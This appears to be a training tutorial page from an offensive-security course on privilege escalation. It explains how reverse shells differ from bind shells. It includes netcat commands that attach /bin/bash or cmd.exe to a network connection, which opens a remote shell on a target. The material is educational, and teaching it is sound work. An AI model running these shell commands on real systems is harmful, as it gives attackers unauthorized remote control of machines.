<h1>$${\color{red}Types} \space {\color{Goldenrod}of } \space {\color{blue}Shell}$$</h1>

At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.


1. ***Reverse shells*** are when the target is forced to execute code that connects back to your computer.
> Reverse shells are a good way to ***bypass firewall rules*** that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.

2. ***Bind shells*** are when the code executed on the target is used to start a listener attached to a shell directly on the target.
> This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be ***prevented by firewalls protecting*** the target.

As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.

************




<h3 align="center">Reverse Shell example:</h3>


Let's start with the more common reverse shell.

Picture the image on the left as being your own computer, and the image on the right as being the target.

On the attacking machine:

```sudo nc -lvnp 443``` <kbd>Your Machine</kbd>

On the target:

```nc <LOCAL-IP> <PORT> -e /bin/bash``` <kbd>Target Machine</kbd>

<p align="center">
<img src="https://github.com/4bo4yman/Privilege-Escalation/assets/156849852/4c95ad4d-6a99-43dd-9bda-6fd86636a5a2">
</p>

> Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.

*************



<h3 align="center">Bind Shell example:</h3>

Bind shells are less common, but still very useful.

Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.

On the target:

```nc -lvnp <port> -e "cmd.exe"``` <kbd>Target Machine</kbd>

On the attacking machine:

```nc MACHINE_IP <port>``` <kbd>Your Machine</kbd>

<p align="center">
<img src="https://github.com/4bo4yman/Privilege-Escalation/assets/156849852/094522dc-1d3d-4a06-9710-f06d5498b8b1">
</p>

> As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.

> The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.

*******






